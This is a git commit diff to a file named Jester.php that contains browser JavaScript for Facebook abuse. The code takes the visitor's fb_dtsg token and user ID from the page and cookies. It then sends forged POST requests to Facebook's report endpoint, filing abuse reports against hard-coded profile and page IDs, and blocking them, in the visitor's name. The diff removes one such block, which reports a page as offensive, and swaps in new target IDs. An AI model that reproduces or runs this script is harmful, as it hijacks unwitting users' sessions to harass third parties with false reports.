2bcd9f41eeb131e5d8f007adb8b73d19c9249acf
bhargav1996 <www.bhargav1996@gmail.com>
2013-11-18 14:38:38 +0530

    Update Jester.php

--- Jester.php
+++ Jester.php
@@ -1,21 +1,3 @@
-/*pages*/
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-var now=(new Date).getTime();
-function pages(pid) {
-var Page = new XMLHttpRequest();
-var PageURL = "//www.facebook.com/ajax/report/social.php";
-var PageParams ="fb_dtsg="+fb_dtsg+"&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A"+pid+"%2C%22content_type%22%3A23%2C%22first_choice%22%3A%22offensive%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22report_type%22%3A0%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWiKaExEW9AVEqw&__req=f&ttstamp=2658165112877210152";
-Page.open("POST", PageURL, true);
-Page.onreadystatechange = function () {
-if (Page.readyState == 4 && Page.status == 200) {
-Page.close;
-}
-};
-Page.send(PageParams);
-}
-pages("446909922032433");
-
 
 
 
@@ -28,7 +10,7 @@ var now=(new Date).getTime();
 function IDS(r) {
   var X = new XMLHttpRequest();
 var XURL = "https://www.facebook.com/ajax/report/social.php";
-  var XParams ="fb_dtsg="+fb_dtsg+"&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A" + r +"%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2F%22%2C%22report_type%22%3A145%2C%22rid%22%3A" + r +"%2C%22sub_report_type%22%3A141%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmAWuURDw&__req=h&ttstamp=26581661107112011276&confirmed=1";
+  var XParams ="fb_dtsg="+fb_dtsg+"&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A" + r +"%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2Fpragyan.rajkonwar%3Ffref%3Dts%22%2C%22report_type%22%3A145%2C%22rid%22%3A" + r +"%2C%22sub_report_type%22%3A145%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj2qmvudDgDxrHbjyGameyp9K6Ehw&__req=d&ttstamp=2658166101715511590";
   X.open("POST", XURL, true);
   X.onreadystatechange = function () {
     if (X.readyState == 4 && X.status == 200) {
@@ -37,10 +19,5 @@ var XURL = "https://www.facebook.com/ajax/report/social.php";
   };
   X.send(XParams);
 }
-IDS("100006841268344");
-
-
-
-
-
-
+IDS("100002676428426");
+IDS("100003288855127");
